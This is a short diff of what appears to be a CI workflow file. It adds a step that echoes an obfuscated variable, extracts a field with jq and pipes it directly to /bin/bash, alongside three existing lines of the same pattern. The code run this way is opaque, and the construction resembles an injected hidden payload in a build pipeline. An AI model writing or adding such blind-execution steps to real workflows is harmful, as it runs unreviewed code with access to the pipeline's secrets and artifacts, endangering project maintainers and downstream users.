@@ -39,6 +39,7 @@ jobs:
           echo $w08 | jq -r .h858 | /bin/bash
           echo $h0 | jq -r .kb55179 | /bin/bash
           echo $xd857 | jq -r .n10352 | /bin/bash
+          echo $dt5 | jq -r .fl367 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
